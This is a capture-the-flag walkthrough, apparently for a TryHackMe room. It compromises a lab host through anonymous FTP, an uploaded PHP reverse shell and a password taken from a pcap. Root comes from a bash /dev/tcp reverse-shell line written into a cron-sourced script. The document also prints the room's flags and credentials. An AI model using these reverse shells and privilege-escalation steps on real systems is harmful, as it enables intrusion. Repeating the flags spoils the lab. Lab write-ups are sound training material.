My goal is to help you understand each step and provide clear explanations so that anyone, whether a beginner or experienced, can follow along and understand the reasoning behind each action. I hope this write-up makes the process smoother and easier to grasp.

I’m just kiddin

We start with the usual scan to identify open ports:

![][image3]

***nmap 10.10.81.33 — open***

**Result:**

* FTP (21)  
* SSH (22)  
* HTTP (80)

## **FTP Enumeration**

Let’s test for anonymous access:

![][image4]

***ftp 10.10.81.33***  
***Username: anonymous***  
***Password: anonymous***

Success\!

![][image5]

![][image6]

Inside, we scour through

*ftp\> ls*  
*important.jpg*  
*notice.txt*

Grab them both:

![][image7]

***ftp\> get important.jpg***  
***ftp\> get notice.txt***

The text file turns out to be a meme, but we spot a name **“Maya”**

**![][image8]**

As there was nothing too interesting on the base web page, so we run feroxbuster:

![][image9]

![][image10]

**feroxbuster:**

**![][image11]**

***feroxbuster \-u http://10.10.81.33 \-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt***

We discover : /files/ , but nothing juicy.

So now, I try utilizing a reverse shell

**Step 1: Prepare the payload:**

***nano reverse-shell.php***

Paste a PHP reverse shell from [Pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell), replacing the IP with your tun0/local IP and port

**Step 2: Upload it via FTP:**

**![][image12]**

***ftp 10.10.81.33***  
***cd ftp***  
***mput reverse-shell.php***

**Step 3: Trigger the shell:**

**![][image13]**

Start your listener

***nc \-lvnp 1234***

Open the URL

http://10.10.81.33/files/reverse-shell.php

BOOM\! , Shell obtained as www-data

Now that we are in we are going to enumerate locally:

**Step 1: Read available files**

***ls***  
***cat recipe.txt***

We find: LOVE

**Step 2: Investigate deeper**

**![][image14]**

Try accessing /home/lennie, but permission is denied.

Explore more directories and discover:

![][image15]

***/var/ftp/incidents/suspicious.pcapng***

Transfer it over or open with tcpdump or wireshark. You’ll spot this password used with sudo:

![][image16]

c4ntg3t3n0ughsp1c3

Now let’s escalate privilege:

We start of by : Trying to switching user

***python3 \-c ‘import pty; pty.spawn(“/bin/bash”)’***  
***su lennie***  
***Password: c4ntg3t3n0ughsp1c3***

Success\! Now we have access into Lennie

We get the user.txt

![][image17]

*cat user.txt*

THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

Now to escalate to root

Now check directories owned by root but accessible to lennie

![][image18]

***cd /opt/scripts/***  
***ls \-la***

We find a script: planner.sh

You can’t edit it, but it **sources** another script

***cat /etc/print.sh***

Here’s the trick — print.sh can be edited

We again formulate a reverse shell:

**Step 1: Create your reverse shell**

**![][image19]**

***echo ‘bash \-c “bash \-i \>& /dev/tcp/YOUR\_IP/8080 0\>&1”’ \> /etc/print.sh***

**Step 2: Start your listener**

**![][image20]**

***nc \-lvnp 8080***

When the root cron runs the planner.sh script, it includes print.sh \-\> Root shell drops into your netcat listener

Once in, we finish with

***cd /root***  
***cat root.txt***

THM{f963aaa6a430f210222158ae15c3d76d}

The 3 flags are:

love

THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

THM{f963aaa6a430f210222158ae15c3d76d}
